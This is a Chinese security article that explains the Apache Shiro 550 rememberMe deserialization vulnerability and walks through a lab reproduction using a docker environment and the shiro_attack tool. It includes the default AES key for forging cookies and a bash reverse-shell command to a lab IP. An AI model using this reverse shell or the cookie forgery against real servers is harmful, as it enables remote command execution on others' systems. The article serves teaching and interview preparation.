---
title: Shiro 550 RememberMe 反序列化漏洞
url: https://mp.weixin.qq.com/s/u7sYV7-Em5KE8u_UZjXFcA
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:29:26.386425
---

# Shiro 550 RememberMe 反序列化漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIDTblJYD4ATLDibxISicLjeibicPUbRtn0EDMicvcGYINssVwNlRoHibNCjI1fRNzeZKbgSGFdRwpSY0sy2Rz8aUiczAmK8NX8ubpCxp8/0?wx_fmt=jpeg)

# Shiro 550 RememberMe 反序列化漏洞

原创

成渝Sec
成渝Sec

成渝Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**点击蓝字 关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKID0x9py8AUyeSLEWuviaMpzEtwd3E8mtKoRCMkYiaBn1S8D3hlzlfOYMbngqNQ4HYeaV0o1iczYKM9HKqic1EdiaCw0slic6rnFBJwVM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDtEb0tNrwkibZZMEvib92uE4T8u4L4YPQUz78eMta6EribxicUsiaNg0s7Vp5BEMjcNLwicDHibEfjCh5o1iboCA9we6Xff99j0HU3esA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIBib8AD6icRYls5qVz4d18sP8KHwMNQC25L9CsqeuA7vcPMIfXFGib1huicaSyJnnGdFWLMAQsboF35ta7ibJyLGIibjLmVV9Uu1nzibg/640?wx_fmt=png&from=appmsg)

**面试官问题**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIAAm7a3zVotoWxXKl4uZI1pxYpEUz7tfKqk9aF5JVQwOg9icWSYJGcmpRIxKvR6ooxwqgpjU918g2VM3Agc3SMYibS6KjMETZp6k/640?wx_fmt=png&from=appmsg)

Shiro 550 反序列化漏洞？

Shiro 用默认/已知密钥对不安全的 Java 反序列化数据进行加解密，导致攻击者可伪造恶意 rememberMe 触发任意命令执行。

**面试官问题**

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDb1OjvBoyxzIIa5JxMcteDqweYbBYR0ckLGualjdh68yzmESey4fPdL8sBibWhKEOF4Ns51d7ZJ6KlzCjtlbxHjFEJhZP2Eicls/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDJ07xqh9SfQjpOCrScC5kiag9nnbzvtdFfLOeJGR4VictegDzbXibEYDqibRBUnEXN2kLevJYTngsYyMCibpQhMiakShTuB5KH9ZNw0/640?wx_fmt=png&from=appmsg)

Shiro-550 与 Shiro-721 区别？

Shiro有550和721，两者都是使用相同的加密技术：

```
Java序列化->使用密钥进行AES加密>Base64 加密>得到加密后的remember Me内容(解密原理反过来)。
```

二者区别主要在于AES加密的密钥Key被硬编码在代码里，550的话他的key是固定的，我们可以去大量收集之后爆破，而721的key是随机生成的，所以721的漏洞利用要比550复杂。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIB1icz9KZibFO0BSPw3ucmBVtvYVyjgYoRTGQZvOukHQbYhtYD5gibdp4kNibIjO3HqwX2SOc128kYKgZM43PaiaH1dUzoOSBaX7HKc/640?wx_fmt=png&from=appmsg)

Shiro概述

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDMAAp6ysgibHHqJaULuqDcrwt4AArrsRLgrqszBQRzYMvqdiamRz9QeuIYzyjXtdPcxiaeT7OfYWLkWzdWoDYjoy8TLxpCC8wIKM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIA7rY0VxR1qf9ibNvNJibwRkudDtlCqcVogtQACvG2fYVflwRbP1mbicoS0GyTCuRzq56boGHuzETjWn0GJsLiaaaZLmsshTN6tBLY/640?wx_fmt=png&from=appmsg)

Apache Shiro是一个用于身份验证、授权、加密和会话管理的Java安全框架。Shiro 框架提供了一个RememberMe功能，允许用户在下次访问时无需重新登录。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIBOEIdobp3Qqv1orE7YEBIFowvgX2t61czlZM7mjHPxJgK6ibvUXAh6anzuJrUuZ3ibL8OSolS4yPicQLLm32UeOT00ZAZWwmphIM/640?wx_fmt=jpeg)

这个功能通过在Cookie中设置一个rememberMe字段来实现。Shiro在处理rememberMe字段时，会在cookie中生成rememberMe字段，该过程先将用户信息序列化，再使用AES加密，最后进行Base64编码，rememberMe记录该Base64编码作为身份凭证。当用户再次访问系统时，会先进行Base64解码，然后使用AES解密，最后反序列化。然而Shiro550的默认AES密钥是硬编码在框架中的。

所以这使得攻击者可以轻易地构造一个恶意的序列化对象，将其AES加密并Base64编码后，作为rememberMe字段发送给Shiro服务端。在服务端接收Cookie后会检查RememberMe的值-> Base64解码->使用AES解密(加密密钥硬编码)->反序列化(未作过滤处理）。

如果没有修改默认的密钥那么就很容易就知道密钥了，攻击者可以使用Shiro550的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDFWPhevnDJjqJH849eZW7bhOQ0koLZm2svGrB2uUAQ6icMENwCaJKQuib0e6IrOZ3SJ6E8LU65QJxTXDrlDelNkseysCK4icicTY4/640?wx_fmt=png&from=appmsg)

Shiro 550 反序列化漏洞漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDHZzNQwroWGoNvdXLR1Gv1LBeeaa52uaaXBapcvxTsoicURXvXziclPgiaCnsK7Wc6FHjnSycueAUv258TUUv2VQQew14HllGvAo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKICAIvIH0XWsruvo8vuvkOQV3WfTAR45PH8m81sTNhK6642wLOHsDJEsHDvsAmRgS8kUIYBGTdDRFznBx62CD00bok4EmzF8ZQ4/640?wx_fmt=png&from=appmsg)

漏洞环境搭建

```
路径：shiro/CVE-2016-4437
```

启动容器：

```
docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIAXcpuraGicACibJibRmkAluQNibsa75cu28snTL0tVic7pPaIxeGKPKLHBMvIHbQQKU6ZERSW6stiaaNV1vAkMbnjDibcy6jLOt8wTIw/640?wx_fmt=png&from=appmsg)

访问 `ip:8080` 进入环境：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIAXRR0yRAxLLWtXh3qiaSDCqqjMibnlqgsOU5ibliafeNYgT9HdFO52yWtic2VemAhPBt3oicuNySxmNsmIFpljWagOtSkXTYzOrtQwQ/640?wx_fmt=jpeg)

使用BP拦截抓包，输入账号密码，勾选上 Remember me：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Shiamu7mxKIB03amf5ugpAXUNv5HtFtj1gicyeyvMS4YNMibALFpOj9t2kNlzgDznPOiceuQYfANgy3AZs7dISPXpSPqiaxYJoPQlLzcaAD6ZsqE/640?wx_fmt=jpeg)

可以看到响应包中出现了字段 `set-Cookie: rememberMe=deleteMe`，证明该系统使用了Shiro框架。

###### 接下来，使用shiro\_attack工具检测漏洞，当目标系统存在漏洞时，检测结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIAIDImUN5FlxZZJXmDvH86xwLXTUUInpogeibC3kP6PggIt8YibQMtDBIpZeXRDj2f2JXP35GKoKUYjSCfsraOK3AyCA3HpmkwEE/640?wx_fmt=jpeg)

######

###### 漏洞利用

还是使用上面的工具，爆破出利用链：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Shiamu7mxKIBYaR3JQ3KJKzQUzEnIHvJjNBk1TD4icZsV8TRdDOgB4Kcfs1vIXSRlQZSSTKZ5PZM2696nHzECWpMeQuDIiaWhhQfYXcISDObmE/640?wx_fmt=jpeg)

可以执行命令反弹shell：

```
bash -c 'exec bash -i &>/dev/tcp/192.168.50.131/7777 <&1'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKID2ZMAhNAe392FEHjPYoIyZgAUDKSxgMkuhTQjjV2aRdCHD9Q9aGbibHVmibrkl4FQjic9OicoaIpyuI5rCuibuTgqJMpVgZmz60jrQ/640?wx_fmt=png&from=appmsg)

反弹shell成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKICcQYorLWv3AOQbIAhfS4JyUJBK2hKBqlLb9egR1RBGY4GJyJ2EH3X9Fnglb8d62PwMVd3o9IWwZaxgzeIFQvdNzMOCHC46LOE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIAu642f38VFiclzDGuO9DQa5QpS48icXU1QOvE0l418KNhBzz86ucVA5ThhZI8mb3qC4kONwr2ibXYGMuOc0QITTo2FKulL28xcKM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKIDFWPhevnDJjqJH849eZW7bhOQ0koLZm2svGrB2uUAQ6icMENwCaJKQuib0e6IrOZ3SJ6E8LU65QJxTXDrlDelNkseysCK4icicTY4/640?wx_fmt=png&from=appmsg)

Shiro 550 反序列化漏洞攻击原理

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Shiamu7mxKIDHZzNQwroWGoNvdXLR1Gv1LBeeaa52uaaXBapcvxTsoicURXvXziclPgiaCnsK7Wc6FHjnSycueAUv258TUUv2VQQew14HllGvAo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Shiamu7mxKICAIvIH0XWsruvo8vuvkOQV3WfTAR45PH8m81sTNhK6642wLOHsDJEsHDvsAmRgS8kUIYBGTdDRFznBx62CD00bok4EmzF8ZQ4/640?wx_fmt=png&from=appmsg)

一、漏洞根本原因

默认密钥硬编码 + 反序列化未过滤

Shiro 框架在 < 1.2.4 版本中：

* AES 加密密钥写死在代码中（默认密钥 kPH+bIxk5D2deZiIxcaaaA== 等）
* 服务端对 rememberMe Cookie 进行 Base64解码 → AES解密 → 反序列化，未对反序列化内容做任何过滤或校验

二、攻击流程

```
1. 构造恶意 Payload                                       恶意命令 → 生成 Java 反序列化链（如 CommonsCollections）
```

```
2. 加密编码                                                恶意对象 → Java 序列化 → AES加密（默认密钥）→ Base64编码
```

```
3. 触发漏洞                                                 设置 Cookie: rememberMe=编码后的值 → 发给目标服务器
```

### 三、核心关键点

| 环节 | 为什么可利用 | 攻击者控制点 |
| --- | --- | --- |
| **序列化** | 用户信息可被替换为任意 Java 对象 | 构造恶意对象 |
| **AES 加密** | 密钥是公开已知的（未修改默认值） | 用相同密钥加密 |
| **Base64 编码** | 仅编码，无安全作用 | 自行编码 |
| **反序列化** | 不检查反序列化类，触发任意代码 | 利用已知反序列化链（如 CC链、CB链） |

![图片](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_67@2x.png)如果文章对你有帮助，请关注我的公众号：

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/4U7y70dsprCjIyYyHgQufrWbicAMWEzOdQGaibvZL3xqtoYyyrmWzhOWSFTJ84u4UwKb6FicXF3DHxiakOAjPw0eHg/0?wx_fmt=png)

成渝Sec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/4U7y70dsprCjIyYyHgQufrWbicAMWEzOdQGaibvZL3xqtoYyyrmWzhOWSFTJ84u4UwKb6FicXF3DHxiakOAjPw0eHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过